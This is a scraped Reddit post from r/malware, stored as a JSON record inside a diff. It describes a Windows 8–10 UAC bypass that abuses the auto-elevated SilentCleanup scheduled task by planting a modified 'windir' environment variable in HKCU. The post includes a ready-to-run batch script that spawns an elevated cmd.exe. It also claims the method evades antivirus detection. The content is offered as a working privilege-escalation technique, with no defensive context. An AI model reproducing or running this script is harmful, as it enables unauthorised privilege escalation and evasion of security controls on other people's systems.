@@ -1,0 +1,21 @@
+{
+    "op": {
+        "upvote_ratio": null,
+        "selftext": "You can bypass highest UAC setting by abusing auto-elevated Task called \\*\\*SilentCleanup\\*\\* and make it execute any file you want with admin privileges.\n\n&amp;#x200B;\n\nIt is done by adding temporary modifed enviroment variable \"\\*\\*windir\\*\\*\" into \\*\\*HKCU\\*\\*.\n\n&amp;#x200B;\n\nAdding \\*\\*\"REM \"\\*\\* at the end of windir will make rest of the file path to \\*\\*cleanmgr.exe\\*\\* get treated as a \"note\" which allows us to run any file we want.\n\n&amp;#x200B;\n\nExample: Setting windir to: \\*\\*\"cmd /c start powershell.exe &amp;&amp; REM \"\\*\\* will open up elevated powershell.\n\n&amp;#x200B;\n\nThis method doesn't get picked up by any antivirus.\n\n&amp;#x200B;\n\n\\*\\*Here's a little script I wrote to elevate cmd.exe with highest privileges:\\*\\*\n\n&amp;#x200B;\n\n@echo off\n\nmode 20,1\n\nreg add \"HKCU\\\\Environment\" /v \"windir\" /d \"cmd /k REM \" &gt;nul\n\ntimeout /t 2 &gt;nul\n\nschtasks /run /tn \\\\Microsoft\\\\Windows\\\\DiskCleanup\\\\SilentCleanup /I &gt;nul\n\ntimeout /t 2 &gt;nul\n\nreg delete \"HKCU\\\\Environment\" /v \"windir\" /F &gt;nul\n\n&amp;#x200B;",
+        "title": "Bypassing highest UAC setting [Windows 8 - 10] (Very simple and fileless)",
+        "score": 1,
+        "id": "aacqhe",
+        "commsNum": 0,
+        "timeStamp": "2018/12/28-10:15:18",
+        "author_name": "nyshone69",
+        "is_self": true,
+        "locked": false,
+        "num_comments": 0,
+        "over_18": false,
+        "spoiler": false,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "https://www.reddit.com/r/Malware/comments/aacqhe/bypassing_highest_uac_setting_windows_8_10_very/"
+    },
+    "posts": {}
+}
